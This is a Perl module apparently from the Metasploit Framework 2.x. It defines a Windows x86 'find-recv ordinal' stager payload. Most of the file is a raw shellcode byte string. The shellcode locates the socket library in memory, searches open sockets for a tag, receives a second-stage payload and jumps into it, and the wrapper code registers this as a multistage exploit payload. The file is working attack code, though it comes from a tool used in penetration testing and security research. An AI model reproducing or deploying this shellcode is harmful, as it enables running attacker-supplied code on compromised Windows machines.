###############
##
#
#    Name: FindRecvOrdinalStager.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 find tag recieve stager for Windows.
#
##
###############

package Msf::PayloadComponent::Windows::ia32::FindRecvOrdinalStager;

use strict;
use base 'Msf::PayloadComponent::Windows::FindRecvStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'win32' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					FINDTAG => [ 84, 'RAW' ]
				},
			Payload =>
				"\xfc\x33\xff\x64\x8b\x47\x30\x8b\x40\x0c\x8b\x58\x1c\x8b" .
				"\x1b\x8b\x73\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32" .
				"\x75\xef\x8b\x6b\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c" .
				"\x0d\x1c\x8b\x5c\x29\x3c\x03\xdd\x03\x6c\x29\x24\x57\x66" .
				"\x47\x8b\xf4\x56\x68\x7f\x66\x04\x40\x57\xff\xd5\xad\x85" .
				"\xc0\x74\xee\x99\x52\xb6\x0c\x52\x56\x57\xff\xd3\xad\x3d" .
				"\x6d\x73\x66\x21\x75\xdd\xff\xe6"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
